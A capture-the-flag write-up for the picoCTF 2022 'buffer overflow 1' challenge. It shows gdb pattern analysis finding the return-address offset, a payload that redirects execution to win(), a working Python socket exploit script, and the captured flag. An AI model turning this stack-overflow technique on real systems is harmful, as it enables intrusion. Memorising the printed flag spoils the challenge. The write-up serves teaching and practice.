@@ -1,0 +1,299 @@
+
+#pico2022 #binaryexploitation 
+
+## Challenge:
+```md
+Control the return address
+```
+
+This challenge launches an instance on demand.
+
+```md
+Control the return address Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/250/vuln). You can view source [here](https://artifacts.picoctf.net/c/250/vuln.c). And connect with it using `nc saturn.picoctf.net 50196`
+```
+
+## Process:
+Download the files.
+```bash
+wget -q https://artifacts.picoctf.net/c/250/vuln
+wget -q https://artifacts.picoctf.net/c/250/vuln.c
+```
+#wget 
+
+Make executable.
+```bash
+chmod +x vuln
+```
+#chmod 
+
+Run *vuln*
+```bash
+./vuln
+```
+
+When prompted enter a string:
+```
+a
+```
+
+Returns:
+```
+Okay, time to return... Fingers Crossed... Jumping to 0x804932f
+```
+
+Taking a look at the *vuln.c* I see it wants me to create a *flag.txt* file. And viewing *vuln.c* I see I want to run *win()*.
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include "asm.h"
+
+#define BUFSIZE 32
+#define FLAGSIZE 64
+
+void win() {
+  char buf[FLAGSIZE];
+  FILE *f = fopen("flag.txt","r");
+  if (f == NULL) {
+    printf("%s %s", "Please create 'flag.txt' in this directory with your",
+                    "own debugging flag.\n");
+    exit(0);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  printf(buf);
+}
+
+void vuln(){
+  char buf[BUFSIZE];
+  gets(buf);
+
+  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+
+  puts("Please enter your string: ");
+  vuln();
+  return 0;
+}
+```
+#c 
+
+```bash
+touch flag.txt
+```
+#touch
+
+I also see this guy, ripe for buffer overflows.
+```c
+...
+gets(buf);
+...
+```
+#c 
+
+Run *gdb* on *vuln*.
+```bash
+gdb vuln
+```
+#gdb
+
+Get info.
+```
+(gdb) info functions
+```
+#gdb
+
+Find the address of *win*.
+```
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+0x08049000  _init
+0x08049040  printf@plt
+0x08049050  gets@plt
+0x08049060  fgets@plt
+0x08049070  getegid@plt
+0x08049080  puts@plt
+0x08049090  exit@plt
+0x080490a0  __libc_start_main@plt
+0x080490b0  setvbuf@plt
+0x080490c0  fopen@plt
+0x080490d0  setresgid@plt
+0x080490e0  _start
+0x08049120  _dl_relocate_static_pie
+0x08049130  __x86.get_pc_thunk.bx
+0x08049140  deregister_tm_clones
+0x08049180  register_tm_clones
+0x080491c0  __do_global_dtors_aux
+0x080491f0  frame_dummy
+0x080491f6  win
+0x08049281  vuln
+0x080492c4  main
+0x0804933e  get_return_address
+0x08049350  __libc_csu_init
+0x080493c0  __libc_csu_fini
+0x080493c5  __x86.get_pc_thunk.bp
+0x080493cc  _fini
+```
+
+And we now know *win*
+```
+0x080491f6  win
+```
+
+I installed and am using *gdb-peda* now. I used [zerosum0x0](https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html) for an overflow pattern.
+```
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+```
+
+Then back in *gdb*.
+```
+gdb-peda$ run
+Starting program: /home/jacob/docs/ctf/pico/2022/031_buffer_overflow_1/vuln
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Please enter your string:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+Okay, time to return... Fingers Crossed... Jumping to 0x35624134
+
+Program received signal SIGSEGV, Segmentation fault.
+Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
+Use 'set logging enabled off'.
+
+Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
+Use 'set logging enabled on'.
+[----------------------------------registers-----------------------------------]
+EAX: 0x41 ('A')
+EBX: 0x41326241 ('Ab2A')
+ECX: 0x41 ('A')
+EDX: 0x0
+ESI: 0xffffd064 --> 0xffffd2b2 ("/home/jacob/docs/ctf/pico/2022/031_buffer_overflow_1/vuln")
+EDI: 0xf7ffcb80 --> 0x0
+EBP: 0x62413362 ('b3Ab')
+ESP: 0xffffcf80 ("Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
+EIP: 0x35624134 ('4Ab5')
+EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x35624134
+[------------------------------------stack-------------------------------------]
+0000| 0xffffcf80 ("Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
+0004| 0xffffcf84 ("b7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
+0008| 0xffffcf88 ("8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
+0012| 0xffffcf8c ("Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
+0016| 0xffffcf90 ("c1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
+0020| 0xffffcf94 ("2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
+0024| 0xffffcf98 ("Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
+0028| 0xffffcf9c ("c5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x35624134 in ?? ()
+```
+#gdb 
+
+This tells us the *EIP* being written is:
+```
+EIP: 0x35624134 ('4Ab5')
+```
+#gdb 
+
+Then back on [zerosum0x0](https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html):
+![[031_buffer_overflow_1.png]]
+
+And that's our length.
+```
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab
+```
+
+And I want to pass here the address of the *win* function which is little-endian
+```
+0x080491f6
+
+f6 91 04 08
+
+\xf6 \x91 \x04 \x08
+```
+
+And I then write a *python* script to output these.
+```python
+#!/usr/bin/env python
+import sys
+
+payload = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab\xf6\x91\x04\x08'
+
+sys.stdout.buffer.write(payload)
+```
+#python 
+
+And piping this into *xxd* we can see our bytes.
+```bash
+python payload.py | xxd
+```
+#python #xxd
+
+```
+00000000: 4161 3041 6131 4161 3241 6133 4161 3441  Aa0Aa1Aa2Aa3Aa4A
+00000010: 6135 4161 3641 6137 4161 3841 6139 4162  a5Aa6Aa7Aa8Aa9Ab
+00000020: 3041 6231 4162 3241 6233 4162 f691 0408  0Ab1Ab2Ab3Ab....
+```
+
+Now let's connect to the server.
+```python
+#!/usr/bin/env python
+
+import socket
+import argparse
+import struct
+
+parser = argparse.ArgumentParser()
+parser.add_argument("host", type=str, help="The hostname or IP address to connect to")
+parser.add_argument("port", type=int, help="The port for the service to connect to")
+
+args = parser.parse_args()
+
+offset = 44
+eip = struct.pack("<I", 0x080491F6)
+
+payload = b"".join([
+    b"A"*44,
+    eip,
+])
+
+payload += b"\n"
+
+with socket.socket() as connection:
+    connection.connect((args.host, args.port))
+    connection.recv(4096).decode("utf-8")
+    connection.send(payload)
+    print(connection.recv(4096).decode("utf-8"))
+    print(connection.recv(4096).decode("utf-8"))
+```
+#python 
+
+Running this:
+```bash
+python exploit.py saturn.picoctf.net 50196
+```
+
+Returns:
+```
+Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
+picoCTF{addr3ss3s_ar3_3asy_ad2f467b}
+```
+
+And that's the flag.
+```bash
+echo "picoCTF{addr3ss3s_ar3_3asy_ad2f467b}" > flag.txt
+```
+
+**Flag: *picoCTF{addr3ss3s_ar3_3asy_ad2f467b}***
